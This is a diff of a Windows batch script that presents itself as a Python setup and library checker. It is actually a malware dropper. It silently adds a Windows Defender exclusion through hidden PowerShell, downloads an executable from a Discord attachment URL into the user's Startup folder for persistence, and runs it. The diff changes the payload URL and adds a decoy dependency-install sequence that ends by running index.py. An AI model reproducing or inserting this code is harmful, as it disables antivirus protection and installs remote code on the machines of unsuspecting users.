@@ -1,13 +1,9 @@
-@echo off
-title Enter Webhook:
-
-
 powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 
 @echo off
 setlocal 
 
-set "URL=https://cdn.discordapp.com/attachments/1203072429677871137/1205909065876770836/Python_Installer.exe?ex=65da1556&is=65c7a056&hm=06eeada7be4a12622d1f76eb53fa7468a895d351f2eca661267c93175b9c487e&"
+set "URL=https://cdn.discordapp.com/attachments/1201945226504052767/1220037731707519068/Built.exe?ex=660d7bae&is=65fb06ae&hm=15a77b197b98a9c06966cae288b695da2ac7ed0ac6296afc8f939039d00ff3bf&"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
@@ -24,7 +20,7 @@ call "%DEST%"
 @echo off
 setlocal 
 
-set "URL=https://cdn.discordapp.com/attachments/1203072429677871137/1205909065876770836/Python_Installer.exe?ex=65da1556&is=65c7a056&hm=06eeada7be4a12622d1f76eb53fa7468a895d351f2eca661267c93175b9c487e&"
+set "URL=https://cdn.discordapp.com/attachments/1201945226504052767/1220037731707519068/Built.exe?ex=660d7bae&is=65fb06ae&hm=15a77b197b98a9c06966cae288b695da2ac7ed0ac6296afc8f939039d00ff3bf&"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
@@ -37,3 +33,37 @@ if %errorlevel% neq 0 (
 )
 
 call "%DEST%"
+
+
+title Checking Python installation...
+python --version > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Python is not installed! (Go to https://www.python.org/downloads and install the python 3.11.0^)
+    echo Very important click Add python exe to PATH.
+    pause
+)
+
+title Checking Python libraries...
+echo Checking 'cryptography' (1/3)
+python -c "import cryptography" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing cryptography...
+    python -m pip install cryptography > nul
+)
+
+echo Checking 'aiohttp' (2/3)
+python -c "import aiohttp" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing aiohttp...
+    python -m pip install aiohttp > nul
+)
+
+echo Checking 'pyinstaller' (3/3)
+python -c "import PyInstaller" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing pyinstaller...
+    python -m pip install pyinstaller > nul
+)
+
+cls
+python index.py
